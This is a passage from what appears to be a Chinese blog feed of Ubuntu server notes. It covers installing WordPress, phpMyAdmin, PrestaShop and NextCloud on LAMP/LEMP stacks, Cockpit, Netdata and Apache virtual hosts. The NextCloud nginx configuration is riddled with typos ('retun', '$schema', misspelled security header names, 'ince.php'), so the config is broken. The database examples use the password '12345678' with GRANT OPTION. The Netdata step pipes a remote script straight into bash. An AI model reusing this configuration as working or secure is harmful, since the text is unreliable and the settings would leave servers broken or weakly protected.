他会自动写进去表</span></span><br></pre></td></tr></table></figure></p><p><strong>虚拟主机</strong><br>不建议使用默认站点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apache2/sites-available/</span><br><span class="line">cp 000-default.conf  myblog.conf</span><br><span class="line">    vim myblog.conf</span><br><span class="line">    ServerName www.myblog.com</span><br><span class="line">    DocumentRoot /var/www/html/wordpress</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他安全配置</span></span><br></pre></td></tr></table></figure></p><p><strong>启用站点</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a2ensite myblog.conf</span><br><span class="line">a2dissite 000-default.conf    <span class="comment"># 禁用默认站点</span></span><br><span class="line"></span><br><span class="line">systemctl reload apache2</span><br></pre></td></tr></table></figure></p><p><strong>Web配置</strong><br>访问设置的域名<code>http://myblog.com</code></p><p><strong>改为中文</strong><br>从官网下载中文语言包解压到<code>/wp-content/</code>目录下，<br>修改<code>wp-config.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'WPLANG'</span>, <span class="string">'zh_CN'</span>)</span><br></pre></td></tr></table></figure></p><p>或者直接下载中文版<code>https://cn.wordpress.org</code></p><h2 id="PHPMyAdmin-amp-电商网站搭建"><a href="#PHPMyAdmin-amp-电商网站搭建" class="headerlink" title="PHPMyAdmin &amp; 电商网站搭建"></a><font color="red">PHPMyAdmin &amp; 电商网站搭建</font></h2><h4 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h4><pre><code>基于Web应用的MySQL管理应用, 本身也是一个应用程序</code></pre><p>1.修改身份验证方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入sql终端</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host,<span class="keyword">plugin</span> <span class="keyword">from</span> mysql.user;</span><br><span class="line"></span><br><span class="line">"auth_socket"  <span class="comment">--&gt; "mysql_native_password"</span></span><br></pre></td></tr></table></figure></p><p>2.安装PhpMyAdmin<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install phpmyadmin</span><br></pre></td></tr></table></figure></p><p>3.修改<code>/etc/apache2/apache2.conf</code>主配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 包含phpmyadmin的配置文件</span></span><br><span class="line">Include /etc/phpmyadmin/apache.conf</span><br></pre></td></tr></table></figure></p><p>测试 <code>http://wwwwww/phpmyadmin/</code></p><h4 id="电商网站搭建"><a href="#电商网站搭建" class="headerlink" title="电商网站搭建"></a>电商网站搭建</h4><p>安装<code>prestashop</code>开源的电商平台</p><ul><li>开源免费</li><li>全球有25万台电商平台使用</li><li>基于LAMP套件</li></ul><p>1.安装依赖包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.2-gd php7.2-xml php7.2-curl php7.2-zip</span><br></pre></td></tr></table></figure></p><p>2.下载<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.prestashop.com/download/releases/prestashop_1.7.4.1.zip</span><br><span class="line">sudo unzip prestashop_1.7.4.1.zip  -d /var/www/html/myshop</span><br><span class="line">sudo chown www-data:www_data -R /var/www/html/myshop</span><br></pre></td></tr></table></figure></p><p>3.创建数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql</span><br><span class="line"><span class="comment">-- 进入sql命令行（建议用户名密码和库名不要这么简单易猜）</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> myshop;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">'myshop'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'12345678'</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> myshop.* <span class="keyword">to</span> <span class="string">'myshop'</span>@<span class="string">'localhost'</span>  <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'12345678'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure></p><p>4.虚拟主机(不建议使用默认站点)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apache2/sites-available/</span><br><span class="line">cp 000-default.conf  myshop.conf</span><br><span class="line">    vim myshop.conf</span><br><span class="line">    ServerName www.myshop.com</span><br><span class="line">    DocumentRoot /var/www/html/myshop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里只配置了最简单的，其他的配置按照前面的章节自行配置</span></span><br></pre></td></tr></table></figure></p><p>5.启用站点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod rewrite   <span class="comment"># 启用这个模块</span></span><br><span class="line">sudo a2ensite myshop.conf</span><br><span class="line"><span class="comment">#a2dissite 000-default.conf    # 禁用默认站点</span></span><br><span class="line"></span><br><span class="line">systemctl reload apache2</span><br></pre></td></tr></table></figure></p><p>6.访问站点，进行Web配置<br>表名的前缀不要默认，否则如果有漏洞，容易被猜解<br>安装完成之后，要删除<code>install</code>文件</p><blockquote><p>这个网站源码是免费的，但是主题是收费的……且支付接口没国内的</p></blockquote><h2 id="LEMP环境安装NextCloud"><a href="#LEMP环境安装NextCloud" class="headerlink" title="LEMP环境安装NextCloud"></a><font color="red">LEMP环境安装NextCloud</font></h2><p>LEMP(Linux, Nginx, MySQ, PHP)<br>Engine-x  -&gt; Nginx</p><p>1.安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx</span><br><span class="line"></span><br><span class="line">sudo apt install mariadb-server mariadb-client</span><br><span class="line">   sudo mysql_secure_installation</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对不同软件包，安装不同的组件，这里安装下面这些</span></span><br><span class="line">sudo apt install php7.2  php7.2-fpm  php7.2-mysql  php7.2-mbstring  php7.2-xml  php7.2-gd  php7.2-curl  php7.2-imagick  php7.2-zip  php7.2-bz2  php7.2-intl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置php</span></span><br><span class="line">sudo vim /etc/php/7.2/fpm/php.ini</span><br><span class="line">cgi.fix_pathinfo=0</span><br><span class="line">date.timezone = Asia/shanghai</span><br></pre></td></tr></table></figure></p><p>2.配置Nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里使用默认站点</span></span><br><span class="line"><span class="comment"># sudo vim /etc/nginx/sites-available/default</span></span><br><span class="line"></span><br><span class="line">index index.php</span><br><span class="line"> location ~\.php$ &#123;</span><br><span class="line">     fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;</span><br><span class="line">     fastcgi_param SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">     include snippets/fastcgi-php.conf;</span><br><span class="line">     include fastcgi_params;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">sudo nginx -t</span><br><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure></p><p>3.访问, 验证环境是否成功</p><p>4.下载NextCloud<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># NextCloud    免费开源的个人云盘</span></span><br><span class="line"><span class="comment"># 官网下载或wget下载</span></span><br><span class="line">wget https://download.nextcloud.com/server/releases/nextcloud-13.0.4.zip</span><br><span class="line">sudo unzip nextcloud-13.0.4.zip  -d /var/www/html/mycloud</span><br><span class="line"></span><br><span class="line">sudo chown www-data:www-data -R /var/www/html/mycloud</span><br></pre></td></tr></table></figure></p><p>5.建库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 进入sql命令行</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> mycloud;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">'mycloud'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'12345678'</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> mycloud.* <span class="keyword">to</span> <span class="string">'mycloud'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'12345678'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure></p><p>6.生成证书(安全考虑)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里使用自签名证书</span></span><br><span class="line">sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem</span><br></pre></td></tr></table></figure></p><p>7.配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /etc/nginx/site-available/</span></span><br><span class="line"><span class="comment"># sudo vim mycloud.conf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.mycloud.com;</span><br><span class="line">    <span class="comment"># 不让访问者通过http访问，强制重定向</span></span><br><span class="line">    <span class="built_in">return</span> 301 https://www.mycloud.com<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl http2;</span><br><span class="line">    <span class="comment"># 证书位置</span></span><br><span class="line">    ssl_certificate  /etc/ssl/certs/mysite.pem;</span><br><span class="line">    ssl_certificate_key  /etc/ssl/private/mysite.key; </span><br><span class="line">    <span class="comment"># 头部</span></span><br><span class="line">    add_header Strict-Teansport-Security <span class="string">"max-age-31536000"</span> always;  <span class="comment"># ssl增强版协议的头部</span></span><br><span class="line">    <span class="comment"># 等经验丰富后，自己要添加头部信息你</span></span><br><span class="line">    add_header X-Conten-Type-Option nosniff;</span><br><span class="line">    add_header X-XSS-Protection <span class="string">"1;mode=block"</span>;</span><br><span class="line">    add_header X-Robots-Tag none;</span><br><span class="line">    add_header X-Download-Options noopen;</span><br><span class="line">    add_header X-Permitted-Cross-Doamin-Policies none;</span><br><span class="line"></span><br><span class="line">    root /var/www/html/mycloud/;</span><br><span class="line"></span><br><span class="line">    location = /robots.txt &#123;</span><br><span class="line">        allow all;</span><br><span class="line">        log_not_found off;</span><br><span class="line">        access_log off;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    location = /.well-known/carddav &#123;</span><br><span class="line">        retun 301 <span class="variable">$schema</span>://<span class="variable">$host</span>/remote.php/dav;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    location = /.well-known/calddav &#123;</span><br><span class="line">        retun 301 <span class="variable">$schema</span>://<span class="variable">$host</span>/remote.php/dav;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    location = /.well-known/acme-challenge &#123;</span><br><span class="line">        allow all;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    client_max_body_size 512M;</span><br><span class="line">    fastcgi_buffers 64 4K;</span><br><span class="line"></span><br><span class="line">    gzip off;</span><br><span class="line"></span><br><span class="line">    error_page 403 /core/templates/403.php;</span><br><span class="line">    error_page 404 /core/templates/404.php;</span><br><span class="line">    </span><br><span class="line">    location = / &#123;</span><br><span class="line">        rewrite ^ /ince.php<span class="variable">$uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location = /(?:build|tests|config|lib|3rdparty|templates|data)/ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># .......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## ......剩下详细的配置</span></span><br></pre></td></tr></table></figure></p><p>8.启用站点配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/nginx/site-available/mycloud.conf  /etc/nginx/site-enabled/mycloud.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># reload 并 restart nginx</span></span><br></pre></td></tr></table></figure></p><p>9.Data目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件资源默认会在项目根目录下的Data目录</span></span><br><span class="line"><span class="comment"># 建议不要放在默认位置, 这里放在上一级目录</span></span><br><span class="line">sudo mkdir /var/www/html/cloud_data</span><br><span class="line">sudo chown www-data:www-data -R /var/www/html/cloud_data</span><br></pre></td></tr></table></figure></p><p>10.网页设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">访问 https://xxxxx.com</span><br><span class="line"><span class="comment"># 设置用户名/密码，数据库，data目录</span></span><br><span class="line"><span class="comment"># 注意账户安全哦(不要设置admin等)</span></span><br><span class="line"><span class="comment"># 修改语言</span></span><br></pre></td></tr></table></figure></p><p>11.客户端<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:nextcloud-devs/client</span><br><span class="line">sudo apt install nextcloud-client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或官网下载PC和android的客户端</span></span><br></pre></td></tr></table></figure></p><h2 id="其他Web应用"><a href="#其他Web应用" class="headerlink" title="其他Web应用"></a><font color="red">其他Web应用</font></h2><h4 id="1-Cockpit"><a href="#1-Cockpit" class="headerlink" title="1.Cockpit"></a>1.Cockpit</h4><blockquote><p>基于Web的远程管理和系统监控</p></blockquote><ul><li>基于Web的远程管理应用</li><li>将所有组件打包在一起</li><li>不以来单独部署的LAMP/LEMP, 一条命令安装部署</li></ul><p>安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cockpit cockpit-docker</span><br></pre></td></tr></table></figure></p><p>访问方式:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.com:9090</span><br><span class="line"></span><br><span class="line">登录账户同操作系统</span><br><span class="line">可以看到系统的详细信息，管理</span><br><span class="line"></span><br><span class="line">可以添加其他安装了Cockpit的服务器在一个机器的Web界面安装(前提是登录窗口时候进行勾选), 多台服务器</span><br></pre></td></tr></table></figure></p><p>官网地址: <code>https://cockpit-projece.org</code></p><h4 id="Netdata"><a href="#Netdata" class="headerlink" title="Netdata"></a>Netdata</h4><blockquote><p>基于Web建构的Linux系统实时性能监视工具</p></blockquote><ul><li>cpu, 内存，硬盘，网络，进程，硬件</li><li>占用系统资源少(1-3%)</li><li>实时自动告警</li></ul><p>系统出问题之前，往往有异常的征兆</p><p>依赖包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git zlib1g-dev uuid-dev libmnl-dev gcc make autoconf autoconf-archive autogen automake pkg-config curl python python-yaml python-mysqldb python-psycopg2 nodejs lm-sensors netcat</span><br></pre></td></tr></table></figure></p><p>安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -Ss https://my-netdata.io/kickstart-static64.sh)  <span class="comment"># 现在不能访问了</span></span><br><span class="line"><span class="comment"># 或用apt安装</span></span><br><span class="line">sudo apt install netdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">http://xxxxx.com:19999</span><br></pre></td></tr></table></figure></p><p>开关<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动：位置根据系统会有不同。建议加上-D参数前台运行，不要后台运行</span></span><br><span class="line">$ sudo netdata -D</span><br><span class="line">$ 或</span><br><span class="line">$ sudo /usr/sbin/netdata -D</span><br><span class="line"><span class="comment"># 或（Mac上）</span></span><br><span class="line">$ sudo /usr/<span class="built_in">local</span>/sbin/netdata -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭（方法很多种，往往只有一种生效）</span></span><br><span class="line">$ sudo killall netdata</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$ sudo pkill -9 netdata</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$ sudo service netdata stop</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$ sudo /etc/init.d/netdata stop</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$ sudo systemctl stop netdata</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;LAMP&quot;&gt;&lt;a href=&quot;#LAMP&quot; class=&quot;headerlink&quot; title=&quot;LAMP&quot;&gt;&lt;/a&gt;LAMP&lt;/h1&gt;&lt;h2 id=&quot;LAMP环境安装WordPress&quot;&gt;&lt;a href=&quot;#LAMP环境安装WordPress&quot; class=&quot;he
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="LMAP" scheme="http://www.xpshuai.cn/tags/LMAP/"/>
    
      <category term="LEMP" scheme="http://www.xpshuai.cn/tags/LEMP/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-Web服务</title>
    <link href="http://www.xpshuai.cn/ubuntu-server-Web%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.xpshuai.cn/ubuntu-server-Web服务/</id>
    <published>2020-04-28T10:11:19.000Z</published>
    <updated>2020-04-28T10:16:46.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WWW介绍"><a href="#WWW介绍" class="headerlink" title="WWW介绍"></a><font color="red">WWW介绍</font></h2><p>www 万维网</p><ul><li>静态网站：所有人看到的内容都一样</li><li>动态应用程序： <ul><li>数据库、中间件</li><li>每个用户看到的内容不同</li><li>根据用户输入返回不同结果</li></ul></li></ul><p><strong>访问方式</strong><br><img src="/ubuntu-server-Web服务/20200424214945523_10883.png" alt><br>FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）</p><p><strong>传输协议</strong><br>SSL基本被替代了，TSL使用最多<br><img src="/ubuntu-server-Web服务/20200424215120585_7753.png" alt><br>put常用于上传文件<br>options查看都支持哪些方法<br>header只是头部的信息(请求/响应)</p><p><img src="/ubuntu-server-Web服务/20200424235043151_8198.png" alt></p><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a><font color="red">HTTP协议</font></h2><p><strong>常见服务端响应状态码</strong><br><img src="/ubuntu-server-Web服务/20200425094030209_15175.png" alt><br>更多详细状态码，见地址：<br><img src="/ubuntu-server-Web服务/20200425094625729_615.png =400x" alt></p><h2 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a><font color="red">Apache2</font></h2><p>Apache软件基金会的一个开源Web服务器<br><strong>模块化强大的扩展能力：</strong></p><ul><li>SSO模块</li><li>并发限制模块</li><li>日志监控模块</li><li>WAF模块</li><li>负载均衡模块</li><li>音乐/图像处理模块</li></ul><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认侦听端口 TCP 80</span></span><br></pre></td></tr></table></figure><h4 id="通过众多directives进行配置"><a href="#通过众多directives进行配置" class="headerlink" title="通过众多directives进行配置"></a>通过众多<code>directives</code>进行配置</h4><p>在Ubuntu中，directives分散于多个配置文件中<br><img src="/ubuntu-server-Web服务/20200425100139669_32000.png" alt></p><p>配置文件：<code>conf-enabled</code>(启用的)中的文件都是链接到<code>conf-available</code>(可用的)下的配置文件（创建了链接的才生效的，所以可以配置一些备用的不设置链接），修改完需要重启服务<br>模块目录：mods-enabled与mods-available，跟上面两者关系类似<br>站点：sites-enabled与sites-available<br>      不同ip以及不同端口可以映射不同的网站 –&gt; 同一个ip同一个端口来设置多个网站(不同域名都解析到这个ip, 服务端根据域名字段[主机头]来判断返回哪个页面) –&gt; 即为虚拟主机</p><h6 id="虚拟主机简单配置"><a href="#虚拟主机简单配置" class="headerlink" title="虚拟主机简单配置"></a>虚拟主机简单配置</h6><blockquote><p>一般先从available目录开始创建，至于启用与否还得配置enabled<br>本质上配置指令可以位于任何一个配置文件中</p></blockquote><p><strong>配置<code>sites-available</code>下讲解：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/apache2/sites-available/000-default.conf  # 默认虚拟主机</span></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;    <span class="comment"># 匹配ip，*代表任意ip  , 侦听任意ip的80端口</span></span><br><span class="line">ServerName www.example.com<span class="comment"># 设置主机头（虚拟主机的域名）</span></span><br><span class="line">ServerAdmin webmaster@localhost<span class="comment"># 报错时显示的管理员邮箱</span></span><br><span class="line">DocumentRoot /var/www/html<span class="comment"># 指定Web根目录</span></span><br><span class="line">ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log<span class="comment"># 报错日志</span></span><br><span class="line">CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined<span class="comment"># 访问日志</span></span><br><span class="line"><span class="comment"># 侦听端口</span></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></p><p><strong>实验</strong><br>创建<code>ali</code>和<code>baid</code>两个域名的虚拟主机<br>1.创建新的虚拟主机（在sites-available）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复制两个配置文件</span></span><br><span class="line">sudo cp 000-default.conf ali.conf</span><br><span class="line">sudo cp 000-default.conf baid.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别进行配置</span></span><br><span class="line">ServerName www.ali.com</span><br><span class="line">DocumentRoot /var/www/ali</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ServerName www.baid.com</span><br><span class="line">DocumentRoot /var/www/baid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别编辑页面文件</span></span><br><span class="line">sudo vim /var/www/ali/index.html</span><br><span class="line">sudo vim /var/www/baid/index.html</span><br></pre></td></tr></table></figure></p><p>2.创建链接(在sites-enabled)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以用ln 创建</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># apache提供了更简单的方式</span></span><br><span class="line">sudo a2ensite ali  </span><br><span class="line">sudo a2ensite baid</span><br><span class="line"><span class="comment"># 重新加载</span></span><br><span class="line">service apache2 reload</span><br><span class="line"></span><br><span class="line"><span class="comment">## Note：</span></span><br><span class="line">ServerAlias *.lab.com  <span class="comment"># 域名通配符</span></span><br><span class="line">sudo a2ensite mynewSite<span class="comment"># 启用虚拟主机</span></span><br><span class="line">sudo systemctl restart apache2.service  <span class="comment"># 重启服务</span></span><br><span class="line">sudo a2dissite mynewSite<span class="comment"># 停用虚拟主机（禁用某个站点）</span></span><br></pre></td></tr></table></figure></p><p>3.这里做实验，域名就简单通过hosts文件做了解析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.11.130 www.ali.com</span><br><span class="line">192.168.11.130 www.baid.com</span><br></pre></td></tr></table></figure></p><p>3.访问</p><h6 id="侦听端口"><a href="#侦听端口" class="headerlink" title="侦听端口"></a>侦听端口</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/apaches/ports.conf</span><br></pre></td></tr></table></figure><h6 id="Apache中默认基本配置"><a href="#Apache中默认基本配置" 